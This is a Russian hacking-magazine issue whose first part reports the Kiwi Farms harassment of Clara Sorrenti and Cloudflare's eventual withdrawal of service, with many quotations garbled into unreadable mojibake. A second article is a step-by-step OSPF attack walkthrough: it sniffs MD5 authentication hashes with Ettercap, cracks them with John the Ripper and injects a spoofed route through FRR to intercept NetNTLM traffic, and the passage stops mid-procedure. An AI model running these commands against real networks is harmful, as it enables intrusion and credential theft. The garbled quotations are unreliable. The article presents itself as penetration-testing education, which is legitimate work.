ружились совместные фото, снятые на крыль це дома Сорренти, и по ним учас-
тники форума вычислили, где Сорренти живет.
  За этим последовали долгие месяцы оскорблений, угроз и док синга. Сайт
кам пании Drop Kiwi Farms гласит, что на Kiwi Farms публиковалась «личная
информация Клары Сорренти, включая фото и видео сек суаль ного харак тера,
номера телефонов, адреса, а так же личные дан ные дру зей и семьи».
  После сват тинга Сорренти начала всерь ез опасать ся за свою безопасность
и переехала жить в отель, но ее быстро наш ли и там. Дело в том, что она
выложила в сеть фото своего кота, — и участники Kiwi Farms прош тудировали
сайты для бронирования всех местных отелей, сравнили постель ное белье
на фотог рафии и вычислили, где остановилась Сорренти. Ей дали понять, что
уже знают о ее новом местонахождении, заказав в ее номер пиццу.
  После учет ную запись Сорренти в UberEats взломали и на нее посыпались
заказы на сот ни долларов, а неизвестные люди начали отправлять голосовые
сообщения с угрозами ей и членам ее семьи.
   Тог да Сорренти вообще решила покинуть Канаду и уехала к друзь ям
в Северную Ирландию. Однако члены Kiwi Farms снова ее выследили. Вскоре
один из поль зователей разместил в сети фотог рафию, сделан ную напротив
дома, где поселилась Сорренти. К фото прилагалось написан ное от руки сооб-
щение с упоминанием Kiwi Farms.





Вскоре после этого Сорренти собралась пообедать с друзь ями в ресторане
и неизвестные стали сообщать о якобы заложен ных бом бах во всех окрестных
заведениях общепита.
  В схожих обстоятель ствах некоторые из прош лых жертв Kiwi Farms нак -
ладывали на себя руки, и Сорренти тоже рассказывает, что начала задумы вать -
ся о самоубийстве. Однако в кон це августа, ког да ее наш ли даже в Северной
Ирландии, активистка решила, что «устала убегать», и поняла, что нужно
попытать ся дать отпор.
   Так в сети стартовала кам пания Drop Kiwi Farms, в ходе которой Сорренти,
доволь но  известная  в  сети  личность,  привлекла  внимание  крупнейших
мировых СМИ, политиков и активистов к проблеме Kiwi Farms. О произошед -
шем писали в Time, Vice и множестве дру гих изданий.
  Чего добивалась Сорренти? Огласки и «бана» для Kiwi Farms. Чтобы круп-
ные ком пании, подобные Cloudare, перестали зак рывать глаза на происхо-
дящее и оказывать сайту косвенную помощь и под держку. Ведь правила той
же Cloudare запрещают «кон тент, который раскры вает кон фиден циаль ную
личную информацию, подстрекает к насилию, эксплу атирует его или пред -
назначен для введения в заблуждение обществен ности».


CLOUDFLARE ÏÎÄ ÄÀÂËÅÍÈÅÌ

Кам пания Drop Kiwi Farms быстро набрала обороты, выш ла в трен ды социаль -
ных сетей, привлекла внимание активистов и СМИ, и в итоге массовой критике
под верглась имен но ком пания Cloudare, давно оказывавшая сайту защит ные
услу ги. Фак тически Cloudare прик рывала сайт от DDoS-атак, а так же под -
держивала его инфраструк туру.
   Как объясняет в своем Twitter бывший глава по информацион ной безопас-
ности в Facebook&ast;, профессор Стэн форд ского университета Алекс Стамос
(Alex Stamos), Cloudare — это не просто защита от DDoS.


       «Cloudflare óäå ëÿåò îñîáîå âíèìàíèå çàùèòå îò DDoS-àòàê, è îíè,
      áåçóñëîâíî, çàíèìàþòñÿ ýòèì, íî åùå îäíà îãðîìíàÿ öåííîñòü, êîòîðóþ«
      îíè ïðå äîñòàâëÿ þò KF è äðóãèì ñàéòàì, — ýòî ñêîðîñòü. À äëÿ óñïå õà
      ëþáîãî èíòåðíåò‑ñåðâèñà ñêîðîñòü ÿâëÿ åòñÿ êëþ÷åâûì ôàê òîðîì. Âîò
      ïî÷åìó Google è FacebookFacebook&ast; òðàòÿò ìèëëèàðäû íà ýòî ïðå -
      èìóùåñòâî.
       Cloudflare — ýòî íå ïðîñòî ùèò, ñòîÿùèé ïåðåä KF è îñòàíàâëèâàþùèé
       àòàêè.  Cloudflare îáðàùàåòñÿ  ê èñõîäíîìó õîñòó  KF, ñêîðåå âñå ãî
      ïóëåíåï ðîáèâàåìîìó õîñòèíãó â çîíå RU (çäåñü Ñòàìîñ îøèáàåòñÿ,
      è èç ðóíåòà Kiwi Farms âûã íàëè î÷åíü áûñòðî. — Ïðèìå÷. ðåä.), è äåëàåò
      òûñÿ÷è êîïèé ñàéòà, êîòîðûå çàòåì õðàíèò ôèçè÷åñêè (â îïå ðàòèâíîé
      ïàìÿòè) î÷åíü áëèçêî ê êîíå÷íûì ïîëüçîâàòå ëÿì», — ïèøåò Ñòàìîñ.                »
Кстати, в Cloudare заявляли, что вовсе не размещали кон тент Kiwi Farms,
а значит, сайт не под падал под правила, запрещающие «кон тент, который рас-
кры вает кон фиден циаль ную личную информацию, подстрекает к насилию, экс-
плу атирует его или пред назначен для введения в заблуждение обществен -
ности».





                      Глава Cloudare Мэтью Принс

В кон це августа Cloudare была вынуждена как-то отреагировать на происхо-
дящее. Глава Cloudare Мэтью Принс (Matthew Prince) опубликовал в офи-
циаль ном блоге заявление, в котором попытался объяснить, как в Cloudare
относят ся к различным злоупот реблениям.
  В этом сообщении Принс сравнивает ком панию Cloudare с пожарными,
которые не отказываются тушить дома, если в них проживают люди, обла-
дающие сом нитель ными мораль ными качествами.


      «Íåêîòîðûå óòâåðæäàþò, ÷òî ìû äîëæíû îòêëþ÷àòü òàêèå ñåðâèñû (êàê
       Kiwi Farms) èç‑çà êîíòåíòà, êîòîðûé ìû ñ÷èòàåì ïðå äîñóäèòåëüíûì, ÷òî-«
     áû äðóãèå ìîã ëè àòàêîâàòü èõ è âûâåñòè èç ñòðîÿ. Â ôèçè÷åñêîì ìèðå
      ýòî ýêâèâàëåíòíî àðãóìåíòó, ÷òî ïîæàðíàÿ ñëóæáà íå äîëæíà ðåàãè-
      ðîâàòü íà ïîæàðû â äîìàõ ëþäåé, åñëè òå íå îáëàäàþò îïðå äåëåííûìè
      ìîðàëüíûìè êà÷åñòâàìè. Êàê â ôèçè÷åñêîì ìèðå, òàê è â èíòåðíå òå
      ýòî îïàñíûé ïðå öåäåíò, êîòîðûé â äîëãîñðî÷íîé ïåðñïåê òèâå ìîæåò
      íàíåñòè íåï ðîïîðöèîíàëüíûé óùåðá óÿçâèìûì è ìàðãèíàëèçèðîâàííûì
      ñîîáùåñòâàì», — ïèñàë Ïðèíñ.                »
Так же он напом нил, что в истории было всего два прецеден та, ког да Cloudare
отказывалась предоставлять свои услу ги сайтам.
  Первый слу чай имел место в 2017 году — это зак рытие неонацист ского
сайта The Daily Stormer, с поль зователем которого связывали теракт в Шарлот -
свилле, штат Вирджиния (тог да Джеймс Алекс Филдс протаранил на автомоби-
ле толпу людей, в резуль тате чего пострадали 19 человек). Второй слу чай —
блокировка имид жборда 8chan, произошед шая в 2019 году после массового
убийства в городе Эль-Пасо, штата Техас, ког да погибли 20 человек. Свой
манифест нападавший, Пат рик Кру зиус, опубликовал имен но на этом имид -
жборде.
  Нужно под черкнуть, что в обоих слу чаях Cloudare не действовала самос-
тоятель но, на опережение, а дожидалась решений суда и лишь после этого
прек ращала работать с сайтами.
  При этом Принс заявляет, что после обеих блокировок «в ком пании замети-
ли резкое увеличение числа авторитарных режимов, пытающихся вынудить
Cloudare отключить защит ные сервисы для сайтов правозащит ных организа-
ций, при этом ссы лаясь на наши собствен ные аргу мен ты».

      «Ïîñëå ïðèíÿòèÿ ýòèõ ðåøåíèé ó íàñ ñîñòîÿëèñü âàæíûå ïåðåãîâîðû
      ñ ïîëèòèêàìè ñî âñå ãî ìèðà. Â õîäå ýòèõ îáñóæäå íèé ìû ïðèøëè«
       ê âûâîäó, ÷òî Cloudflare íå äîëæíà èìåòü ïðàâî îòêëþ÷àòü çàùèòíûå
      ñåðâèñû  äëÿ  ñàéòîâ.  Íå  ïîòîìó,  ÷òî  ñîäåðæèìîå  ýòèõ  ñàéòîâ
      íå âûçûâàëî îòâðàùåíèÿ (îíî âûçûâàëî), à ïîòîìó, ÷òî çàùèòíûå ñåð-
      âèñû  áîëüøå  âñå ãî  íàïîìèíàþò  èíòåðíåò‑óòèëèòû, —  îáúÿñíÿ åò
      Ïðèíñ — Òî÷íî òàê æå òåëåôîííàÿ êîìïàíèÿ íå îòêëþ÷àåò âàø òåëåôîí,
      åñëè âû ãîâîðèòå óæàñíûå, ðàñèñòñêèå è ôàíàòè÷íûå âåùè. Ïðîêîí-
      ñóëüòèðîâàâøèñü  ñ  ïîëèòèêàìè,  âûñîêèìè  äîëæíîñòíûìè  ëèöàìè
      è ýêñïåðòàìè, ìû ñ÷èòàåì, ÷òî íå äîëæíû îòêëþ÷àòü çàùèòíûå ñåðâèñû,
      åñëè òî, ÷òî âû ïóáëèêóåòå, ÿâëÿ åòñÿ îòâðàòèòåëüíûì è íåï ðàâèëüíûì,
      ýòî îøèáî÷íàÿ ïîëèòèêà.
      Äëÿ ÿñíîñòè: åñëè ìû ïîñòóïèëè òàê â îãðàíè÷åííîì êîëè÷åñòâå ñëó-
       ÷àåâ, ýòî íå çíà÷èò, ÷òî ìû áûëè ïðàâû, êîã äà ýòî ñäå ëàëè. È íå çíà÷èò,
       ÷òî ìû êîã äà‑íèáóäü ñäå ëàåì ýòî ñíîâà».                »
Од нако все попыт ки Cloudare объяснить ся и оправдать свои действия при-
вели толь ко к усилению давления, а шквал критики продолжил нарастать. Заяв-
ление Прин са широко обсуждали в сети, и о мораль но-этическую сторону воп-
роса было сломано немало копей. Ведь ответ на вопрос «кто заслуживает
защиты от DDoS-атак?» оказался гораздо сложнее, чем кажет ся на первый
взгляд.
  В частности, уже упомяну тый Алекс Стамос писал, что Принс нем ного
лукавит, ког да рекомен дует обращать ся к хостерам и давить на них, если речь
заходит о модерации и потен циаль ных блокировках кон тента.


     «Åùå îäíî ïðå èìóùåñòâî, êîòîðîå  Cloudflare ïðå äîñòàâëÿ åò KF, —
      ýòî àíîíèìíîñòü èñõîäíîãî õîñòà, ïîýòîìó, õîòÿ â áëîãå îíè ãîâîðÿò«
      î õîñòèíãå êàê î ïîäõîäÿùåì ìåñòå äëÿ îáåñïå÷åíèÿ áîëåå àãðåññèâ-
      íîé ìîäåðàöèè êîíòåíòà, íà ïðàê òèêå Cloudflare äåëàåò ýôôåêòèâíûì
      õîñòèíã ó ïðîâàéäåðîâ, êîòîðûå íå îòâå ÷àþò íà çàï ðîñû», — îáúÿñíÿë
       ýêñïåðò.                »
Забавно, но действия ком пании осу дил даже бывший оператор сервисов
для DDoS-атак по найму под ником Rasbora. В своем посте он иронизирует
на тему того, что в под ростковом возрасте управлял десят ками сервисов
для DDoS, каждый из которых защищался от кон курен тов с помощью тех самых
«нейтраль ных утилит» Cloudare, о которых писал Принс.

      «Áåç „íåéòðàëüíûõ“ çàùèòíûõ ñåðâèñîâ Cloudflare ÿ íå ñìîã áû îðãà-
      íèçîâàòü ìèëëèîíû DDoS-àòàê. Òðóäíî ïåðåäàòü, íàñêîëüêî âàæíóþ ðîëü«
      èíñòðóìåíòû  Cloudflare èãðàþò â óñïåøíîé ðàáîòå DDoS-ñåðâèñîâ:
      ïðåñòóïíèêè, ó êîòîðûõ íå áûëî çàùèòû Cloudflare, íå çàäåðæèâàëèñü
      â îíëàéíå ïîäîëãó», — ãîâîðèò Rasbora.                »
Бывший дидосер пишет, что ком пания прек расно знает, кому предоставляет
защиту, и продолжает делать это, «полностью осознавая конечный резуль тат
своих действий».


       «Cloudflare îòâå ÷àåò çà  òî, ÷òîáû DDoS-ñåðâèñû îñòàâàëèñü â ñåòè
      è ïðîäîëæàëè ðàáîòàòü. Òå ñàìûå ñàéòû, åäèíñòâåííàÿ öåëü êîòîðûõ —«
      ïîääåðæèâàòü  ñîáñòâåííóþ  áèçíåñ‑ìîäåëü  Cloudflare  ïî  ïðîäàæå
      çàùèòû îò DDoS. Óâàæàåìûé ÷èòàòåëü, ïîæàëóéñòà, ïîäóìàé íàä ïîñ-
      ëåäíèì ïðåäëîæåíèåì. Cloudflare — ïîæàðíàÿ ñëóæáà, êîòîðàÿ ãîðäèòñÿ
      òåì, ÷òî òóøèò ïîæàðû â ëþáîì äîìå, íåçàâèñèìî îò òîãî, êòî òàì
      æèâåò. Òîëüêî âîò îíè çàáûâàþò óïîìÿíóòü î òîì, ÷òî îíè ñàìè àêòèâíî
      ðàçæèãàþò ýòè ïîæàðû è ïîòîì çàðàáàòûâàþò íà èõ òóøåíèè», —
     ðåçþìèðóåò Rasbora.                »
ÁËÎÊÈÐÎÂÊÀ KIWI FARMS

Ког да стало очевид но, что официаль ное заявление Мэтью Прин са, говорив-
шего от лица Cloudare, толь ко увеличило недоволь ство в сети, ком пании все
же приш лось пойти на более решитель ные меры.





                 Заявление о блокировке Kiwi Farms

4 сен тября 2022 года в блоге Cloudare появилось новое сообщение, гласив-
шее, что поставщик перестает оказывать услу ги Kiwi Farms и боль ше не будет
защищать ресурс. Этот шаг Принс объяснил тем, что обстановка продолжала
накалять ся и эскалация происходящего стала напрямую угрожать жизням
людей.


      «Ýòî ýêñòðàîðäèíàðíîå äëÿ íàñ ðåøåíèå, è, ó÷èòûâàÿ ðîëü Cloudflare
       êàê ïîñòàâùèêà èíòåðíåò‑èíôðàñòðóê òóðû, îïàñíîå ðåøåíèå, êîòîðîå«
      íàì íå íðàâèòñÿ. Òåì íå ìåíåå â ïîñëåäíèå 48 ÷àñîâ ðèòîðèêà íà ñàé-
       òå  Kiwi  Farms è  êîíêðåòíûå  öåëåíàï ðàâëåííûå  óãðîçû  óñèëèëèñü
      äî òàêîé ñòå ïåíè, ÷òî ìû ñî÷ëè ýòî áåñïðå öåäåíòíîé ÷ðåçâû÷àéíîé
       ñèòóàöèåé è íåïîñðåäñòâåííîé óãðîçîé ÷åëîâå ÷åñêîé æèçíè, â îòëè÷èå
      îò âñå ãî òîãî, ÷òî ìû ðàíüøå âèäåëè íà Kiwi Farms èëè ó ëþáûõ äðóãèõ
      êëèåíòîâ, — ïèøåò Ïðèíñ. — Ïî÷óâñòâîâàâ ñåáÿ àòàêîâàííûìè, ïîëü-
      çîâàòå ëè Kiwi Farms ñòàëè åùå àãðåññèâíåå. Çà ïîñëåäíèå äâå íåäåëè
     ìû îáðàùàëèñü ê ïðàâîîõ ðàíèòåëüíûì îðãàíàì ñðàçó â íåñêîëüêèõ
     þðèñäèêöèÿõ, ïðèâëåêàÿ èõ âíèìàíèå ê òîìó, ÷òî íà ñàéòå, ïî íàøåìó
     ìíå íèþ, ïóáëèêîâàëèñü ñîîáùåíèÿ î ïîòåíöèàëüíûõ ïðåñòóïíûõ äåé-
      ñòâèÿõ è íåïîñðåäñòâåííûå óãðîçû ÷åëîâå ÷åñêîé æèçíè».                »
Глава Cloudare сету ет, что правоохранитель ные органы, к сожалению, работа-
ют не слиш ком быстро и эскалация рисков происходит гораздо быстрее.

      «Õîòÿ ìû ñ÷èòàåì, ÷òî ïîäîáíî äðóãèì ñèòóàöèÿì, ñ êîòîðûìè ìû ñòàë-
      êèâàëèñü (âêëþ÷àÿ ñëó÷àè Daily Stormer è 8chan), íàì, êàê ïîñòàâùèêó«
      èíôðàñòðóê òóðû, áûëî áû óìåñòíî äîæäàòüñÿ ñóäåáíîãî ïðîöåññà,
      â äàííîì ñëó÷àå íåïîñðåäñòâåííàÿ è ÷ðåçâû÷àéíàÿ óãðîçà ÷åëîâå ÷åñ-
      êîé æèçíè, êîòîðàÿ ïðîäîëæàåò íàðàñòàòü, çàñòàâëÿ åò íàñ äåéñòâîâàòü.
     Íàì íåîáõîäèì ìåõàíèçì íà ñëó÷àé âîçíèêíîâåíèÿ ýêñòðåííîé óãðîçû
      æèçíè ëþäåé, ñïîñîáíûé ãàðàíòèðîâàòü, ÷òî ïîñòàâùèêè èíôðàñòðóê -
      òóðû ìîãóò îïå ðàòèâíî ñîòðóäíè÷àòü ñ ïðàâîîõ ðàíèòåëüíûìè îðãàíàìè,
      à ïðèíÿòûå ðåøåíèÿ áóäóò îñíîâàíû íà íàäëåæàùåé ïðàâîâîé ïðîöåäó-
       ðå. Ê ñîæàëå íèþ, òàêîãî ìåõàíèçìà íå ñóùåñòâóåò, ïîýòîìó ìû ïðè-
      íèìàåì ýòî íåóäîáíîå ýêñòðåííîå ðåøåíèå â îäèíî÷êó», — îáúÿñíèë
      Ïðèíñ.                »
В своих заявлениях руководство Cloudare под черкивает, что это сложное
решение может лишь ухуд шить положение, ведь теперь поль зователи Kiwi
Farms почувству ют себя еще более изолирован ными и атакован ными и станут
лишь агрессивнее. По словам Прин са, «блокировка Kiwi Farms времен но сгла-
живает кон фликт, но она никоим образом не решает основную проблему»,
для устранения которой в обществе должна быть проделана огромная работа.
   Так же Принс высказывает мысль, что Kiwi Farms, скорее всего, оперативно
найдет дру гую инфраструк туру и все равно вернется в онлайн.
С этим мнением явно несог ласна Клара Сорренти, которая 5 сен тября раз-
местила на сайте кам пании Drop  Kiwi Farms сообщение, начинающееся
со слов: «Кам пания окон чена. Мы победили».
  Сорренти пишет, что после бана операторы Kiwi Farms действитель но
попытались укрыть ся в рунете (о чем писал Алекс Стамос), однако не задер-
жались в нем надолго, равно как и в дру гих местах. Дело в том, что российская
ком пания DDoS-Guard, специализиру ющаяся на защите от DDoS-атак, так же
отказалась работать с Kiwi Farms.


     «Ìû ïðå äîñòàâëÿ åì óñëóãè òåì, êòî â íèõ íóæäàåòñÿ, åñëè ñàéò êëèåíòà
      íå ïðåñòóïèë ÷åðòó çàêîíà è åñëè íå ïðèøëî îôèöèàëüíîå óâå äîì-«
      ëåíèå îò óïîëíîìî÷åííûõ îðãàíîâ î çàï ðåòå íà ïîääåðæêó ðåñóðñà.
      Ñåãîäíÿ DDoS-Guard ïðåê ðàòèë ïðå äîñòàâëå íèå óñëóã äëÿ ôîðóìà Kiwi
      Farms, íå äîæèäàÿñü îôèöèàëüíîãî óâå äîìëåíèÿ. Â òå÷åíèå ìíîãèõ ëåò
     ìû ïðèäåðæèâàåìñÿ ïîëèòèêè ñåòåâîãî íåéòðàëèòå òà. Îäíàêî  åñòü
      âåùè, êîòîðûå äëÿ íàñ íåï ðèåìëåìû ïðè ëþáûõ îáñòîÿòåëüñòâàõ», —
      ñîîáùèëè â ïðåññ‑ñëóæáå DDoS-Guard 5 ñåíòÿáðÿ.                »
После блокировки основным каналом связи Муна с поль зователями стал
Telegram. Ког да DDoS-Guard отказался сот рудничать с Kiwi Farms, Мун писал:
«Сегод ня утром DDoS-Guard отказался от нас. Этот мем о том, что Россия —
свобод ная страна, просто смешон».


      «ß íå âèæó ñèòóàöèè, â êîòîðîé Kiwi Farms ïðîñòî ïîçâîëÿò ðàáîòàòü.
       [Ñàéò] ëèáî ïðåâðàòèòñÿ  â  ðàçäðîáëåííóþ îáîëî÷êó ñàìîãî  ñåáÿ,«
       êàê 8chan, ëèáî áóäåò ïðûãàòü ìåæäó õîñòàìè è äîìåííûìè èìå íàìè,
       êàê Daily Stormer», — ïðèçíàâàë Ìóí â íà÷àëå ñåíòÿáðÿ.                »
В настоящее время Kiwi Farms доступен преиму ществен но через Tor, но onion-
сайт работает с перебоями, а найти дру гие варианты, где ресурс не банят
через несколь ко дней, пока не выходит. Так же нужно сказать, что Kiwi Farms
исключили даже из интернет-архива Wayback Machine.
  Сейчас сайт регулярно под вергается DDoS-атакам, а сог ласно свежему
сообщению Муна от 18 сен тября, на днях Kiwi Farms успешно взломали: был
ском прометирован украинский хостер vsys, которым Kiwi Farms поль зовался
как прямым прок си, и в резуль тате учет ная запись администратора. Мун пре-
дупреждает, что, скорее всего, в ходе атаки были украдены пароли, email-
адреса и IP-адреса всех поль зователей ресурса. Тем не менее админ обе-
щает, что работа сайта будет восстановлена.





                    Сообщение о взломе





                 Мун объясняет, как взломали сайт

Что касается Cloudare, в ком пании по-прежнему убеждены, что принятое
решение было вынужденным и скверным, а его последствия могут быть даже



      «ß äóìàþ, ëþäè íåï ðàâèëüíî ïîíÿëè íàøå êîìïëåêñíîå ìíå íèå ïî äàí-
      íîìó âîï ðîñó. Ïî ñóòè, ñèòóàöèÿ çàê ëþ÷àëàñü â òîì, ÷òî íàñ, êàê ïîñ-хуже.«
      òàâùèêà óñëóã áåçîïàñíîñòè, ïîï ðîñèëè îòîéòè â ñòîðîíó, ÷òîáû ñàéò
      ìîã ïîäâåðãíóòüñÿ êèáåðàòàêå. Äëÿ íàñ ýòî äàâíèé âîï ðîñ — ñàìà èäåÿ
       òîãî, ÷òîáû ðåøèòü ïðîáëåìó ïðîáëåìíîãî êîíòåíòà, îòñòóïèâ â ñòî-
      ðîíó è ïîçâîëèâ ïðîâåñòè àòàêó, êîòîðàÿ, âåðîÿòíî, ñàìà ïî ñåáå ÿâëÿ -
      åòñÿ íåçàêîííîé», — êîììåíòèðóåò âèöå‑ïðå çèäåíò Cloudflare Àëèññà
      Ñòàðçàê (Alissa Starzak).                »
Клара Сорренти, уже провозгласившая победу над Kiwi Farms, отмечает, что
недавно даже помощник дирек тора ФБР официаль но признал, что Kiwi Farms
пред ставляет собой «внут реннюю террористическую угрозу». Она обещает, что
ее коман да продолжит следить за Kiwi Farms, но вряд ли ресурс сможет воз-
родить ся и получит такую же доступность и влияние в интернете, какими обла-
дал еще недавно.

      «Áåñ÷èñëåííûå æåðòâû Kiwi Farms ìîãóò ñïàòü ñïîêîéíî, çíàÿ, ÷òî ñàéò
      îáðå ÷åí. Îí íèêîã äà íå âîññòàíîâèò áûëóþ äèíàìèêó è ïðîäîëæèò«
      òåðÿòü ïîäïèñ÷èêîâ, ñ êàæäîé íåäåëåé ñòàíîâÿñü âñå áîëåå è áîëåå
      íåàê òóàëüíûì. <…> Ñåãîäíÿ ìèð ñòàë ëó÷øå», — çàê ëþ÷àåò Ñîððåíòè.                »
﹡ Принад лежит ком пании Meta, которая признана экстремист ской и запрещена
в России.
COVERSTORY





    EVIL TWIN ПОВЕРХ ДИНАМИЧЕСКОЙ
         МАРШРУТИЗАЦИИ




Ата ки на домены динами ческой мар шру -
тиза ции могут устро ить настоящий хаос
в сети, так как наруша ют сам про цесс мар -
шру тиза ции. В этой статье я поделюсь
сво ей  модифи каци ей  ата ки   Evil  Twin        Magama Bazarov                                                                                       Network Security Expert
для перехвата дан ных в сетях на осно ве         in9uz@protonmail.com
про токо ла OSPF. Так же про демонстри рую
спо соб под клю чения к авто ном ной сис-
теме, покажу, как можно обой ти аутен -
тифика цию  и  выпол нить  вредоносную
LSU-инъекцию.




                       Статья имеет озна коми тельный характер и пред -
                       назна чена для специалис тов по безопас ности,
                       проводя щих тес тирова ние в рамках контракта.
                       Автор и  редакция  не  несут  ответс твенности
                        за любой  вред, при чиненный  с при менением
                       изложенной информа ции. Рас простра нение вре-
                      донос ных прог рамм, нарушение работы сис тем
                      и  нарушение  тай ны  перепис ки  прес леду ются
                      по закону.



ÊÀÊ ÐÀÁÎÒÀÅÒ OSPF
OSPF (open shortest path rst) — это протокол внут ридомен ной динамической
маршру тизации, основан ный на математическом алгорит ме Эдсгера Дей-
кстры. Это link-state-протокол, и во время передачи дан ных по OSPF анализи-
рует ся состояние канала. На основе состояния канала OSPF струк туриру ет таб-
лицы маршру тизации, под держивает их акту аль ность и выполняет автомати-
ческий обмен маршрут ной информацией со своими соседями. OSPF — откры -
тый стан дарт, который под держивают все вен доры сетевого оборудования.
И это самый распространен ный протокол внут ридомен ной маршру тизации
в рам ках продак шена.
  В этой статье я буду говорить о второй версии OSPF. Харак теристики ее
таковы:
 • OSPF для тран сляции слу жебной информации исполь зует IP-адрес груп-
   повой рассылки 224.0.0.5 ;
 • под держивает IPv4;
 • работает исключитель но на сетевом уровне;
 • в качестве объявлений состояния каналов исполь зует сообщения LSA (link-
   state advertisement);
 • под держивает VLSM;
 • имеет высокий коэффициент уровня сходимости по сравнению с дистанци-
   онно-век торны ми протоколами;
 • строит дерево крат чайших путей (так как основан на алгорит ме Дейкстры);
 • исполь зует формулу reference  bandwidth  /  link  bandwidth
   для оцен ки стоимости маршру та. То есть кон стан та полосы пропускания
   делит ся на фак тическую скорость полосы пропускания. Однако значение
  reference bandwdith может быть изменено.





                    Установление соседства в OSPF


×òî ìîæåò ïîìåøàòü àòàêóþùåìó?
Протокол OSPF атаковать куда сложнее, чем его родствен ников — дистанци-
онно-век торные протоколы маршру тизации (например, RIP или EIGRP). Обоз-
начу основные проблемы:
 • AS OSPF ìîæåò áûòü ðàç áèòà íà çîíû. Инженеры могут спроекти-
   ровать домен маршру тизации OSPF с несколь кими зонами, чтобы умень -
   шить наг рузку на вычислитель ные ресурсы маршру тизаторов. Нужно учи-
   тывать это в домене маршру тизации OSPF, как и возможность прохождения
   пакетов между этими зонами. Например, если ты собираешь ся выполнять
   инъекции маршру тов.
 • Íà ëè÷èå ïàêåòîâ ïðè âåòñòâèÿ Hello. Под ключить ся к домену маршру -
   тизации OSPF будет возможно, если сетевой администратор не позаботил-
   ся о кон фигурации пассивных интерфейсов, сама кон фигурация позволяет
   отключать рассылку пакетов приветствия на уровне самих анон сиру емых
   сетей. Если в сетевом анализаторе не встретишь пакеты OSPF — либо
  OSPF нет, либо настроены пассивные интерфейсы. А это делает невоз-
  можным проведение атаки на домен динамической маршру тизации.


ÂÌÅØÀÒÅËÜÑÒÂÎ Â ÏÐÎÖÅÑÑ ÌÀÐØÐÓÒÈÇÀÖÈÈ
Чтобы атаковать домен динамической маршру тизации, нужно под ключить ся
непосредствен но к самому процессу маршру тизации. Это можно сделать
через настоящий роутер (имею в виду железку) либо восполь зовать ся FRR.




                       FRRouting — это специальный виртуальный мар-
                    шру тиза тор,  который  может  интегри роваться
                        с твоей ОС и работать как нас тоящий роутер.
                      Очень  кру тая шту ка,  пос кольку  под держи вает
                     множес тво интерес ных протоколов: BGP,  IS-IS,
                       OSPF, EIGRP, VRRP, BFD и так далее. В этой
                        статье я вос пользуюсь именно FRR.


В первую очередь нужно активировать демоны FRR. За каждый протокол будет
отвечать отдель ный демон. Нам понадобят ся демоны ospfd и staticd.


root@kali:~# nano /etc/frr/daemons
ospfd=yes
staticd=yes

Перед запуском демона перек лючаем сетевой интерфейс в promiscuous mode,
разрешаем маршру тизацию и активиру ем работу NAT Helper (NFCONNTRACK).


in9uz@kali:~$ sudo ip link set eth0 promisc on
in9uz@kali:~$ sudo sysctl -w net.ipv4.ip_forward= 1
in9uz@kali:~$ sudo modprobe nf_conntrack
root@kali:~# echo "1" > /proc/sys/net/netfilter/nf_conntrack_
helper

После этого включаем демон FRR и проверяем его состояние.


in9uz@kali:~$ sudo systemctl start frr
in9uz@kali:~$ sudo systemctl status frr





                        Состояние FRR

С помощью коман ды vtysh попадаем на панель управления маршру тиза-
тором:


in9uz@kali:~$ sudo vtysh


kali# show ver





                     Панель управления FRR


Ñòðóêòóðà ëàáîðàòîðíîé ñåòè
В качестве лаборатории мы с тобой выстроим трехуровневую сеть. Для SMB-
шары я выделил отдель ный сег мент (WAREHOUSE), но на самом деле
это просто ком мутатор уровня распределения. Так же есть несколь ко виртуаль -
ных сетей, они находят ся на ком мутаторах уровня доступа, а на ком мутаторах
уровня распределения происходит уже маршру тизация между самими VLAN.
  От казоустойчивость сети обеспечивает HSRPv2. Начиная с уровня распре-
деления, я настроил динамическую маршру тизацию OSPF, все хранит ся
в нулевой BACKBONE-зоне.





                    Топология лабораторной сети

 • 10.10.20.1 — Fake (VLAN 20) (Windows 10 LTSC);
 • 10.10.30.1 — Boundless (VLAN 30) (Windows 10 LTSC);
 • 10.10.50.2 — Attacker (VLAN 50) (Kali Linux);
 • 10.10.50.100 — Dist-SW1 (HSRPv2 Active) (Cisco vIOS L2 Image);
 • 10.10.50.101 — Dist-SW2 (HSRPv2 Standby) (Cisco vIOS L2 Image);
 • 192.168.100.1 — SMB Share (Windows Server 2019 Standard).


Àíàëèç òðàôèêà
Первым делом нам нужно изу чить трафик OSPF, узнать об ID зоны, наличии
аутен тификации, router-id и так далее. Из пакета OSPF Hello, получен ного
от Dist-SW1 (10.10.50.100), можно заметить, что исполь зует ся нулевая зона
0.0.0.0.





                      Дамп OSPF-трафика

Так же исполь зует ся MD5-аутен тификация. Она не позволяет неаутен тифици-
рован ным роутерам входить в процесс маршру тизации. Не зная ключ, под клю-
чить ся к сети OSPF не выйдет.


ÎÁÕÎÄ ÀÓÒÅÍÒÈÔÈÊÀÖÈÈ (AUTHENTICATION BYPASSING)





                        Харак теристики ключа

На скрин шоте некоторые харак теристики ключа. Иден тификатор ключа (ID) —
единица.
   Для сниффинга криптографического MD5-хеша восполь зуем ся утилитой
Ettercap. Перед этим перек лючаемся в promisc.


in9uz@kali:~$ sudo ip link set eth0 promisc on
in9uz@kali:~$ sudo ettercap -G





                         Ettercap обнаружил MD5-хеш

Копиру ем эти хеши и бру тим. Кстати говоря, очень удобно, что хеши сразу
пред ставлены в формате John the Ripper.


in9uz@kali:~$ cat >> ospf-hashes
in9uz@kali:~$ john ospf-hashes --wordlist=ospfwordlist





                 Взломан ный пароль от домена OSPF

Пароль удалось сбру тить, это flatl1ne. С этим ключом мы можем под клю-
чить ся к сети OSPF.


EVIL TWIN È ÏÅÐÅÕÂÀÒ NETNTLM
Íà÷àëî àòàêè
Основной прин цип атаки зак лючается в редистрибуции статического маршру та
в сеть OSPF с наимень шей мет рикой. Эта сеть выступит в качестве век тора
для инъекции ложного маршру та. FRR позволяет оперировать статической
маршру тизацией и ее редистрибуцией, что освобождает нас от исполь зования
дискрет ных утилит (Loki, Scapy и прочих).
  Мы выполним спу финг хоста SMB Share с адресом 192.168.100.1/32.
А имен но с помощью инжекта адреса SMB-шары. Инжект пред ставляет собой
LSA-сообщение пятого типа, будет сгенерировано сообщение LSU (link-state
update), после чего легитим ный маршру тизатор примет наш инжект и поместит
его в таблицу маршру тизации, а так же сообщит осталь ным соседям об этом
объявлении.


kali# conf ter
kali(config)# router ospf
kali(config-router) network 10.10.50.3/32 area 0.0.0.0
kali(config-router) redistribute static metric 0




                   В таб лице маршру тиза ции хра нят ся только луч -
                   шие маршру ты. У твоего инжекта дол жны быть
                       наилуч шие характерис тики, а именно адми нис -
                        тра тивное рас стояние и мет рика.


